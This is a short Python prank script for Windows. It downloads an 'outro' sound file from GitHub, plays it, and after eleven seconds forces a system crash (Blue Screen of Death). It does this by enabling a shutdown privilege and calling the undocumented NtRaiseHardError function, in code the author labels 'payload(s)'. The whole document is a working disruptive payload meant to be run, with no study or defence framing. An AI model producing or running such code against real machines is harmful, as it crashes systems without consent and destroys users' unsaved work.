#---<imports>---
from ctypes import windll , c_int , c_uint , c_ulong , POINTER , byref
from requests import get
from os import path,mkdir,getcwd
from winsound import PlaySound,SND_ASYNC
from time import sleep

#---<payload(s)>---
def getfile():
    depreq = get('https://github.com/CodeSyncio/computer-outro-downloadables/blob/main/outro.wav?raw=true')
    if path.exists('MP3'): pass
    else: mkdir('MP3')
    open(f'{getcwd()}\\MP3\\outro.wav', 'wb').write(depreq.content)

def bsod():
    nullptr = POINTER(c_int)()
    windll.ntdll.RtlAdjustPrivilege(c_uint(19) , c_uint(1) , c_uint(0) , byref(c_int()))
    windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B) , c_ulong(0) , nullptr , nullptr , c_uint(6) , byref(c_uint()))
    
def play():
    PlaySound(f'{getcwd()}/MP3/outro.wav', SND_ASYNC)
     
#---<start>---
if __name__ == '__main__':
    getfile()
    play()
    sleep(11)
    bsod()
    
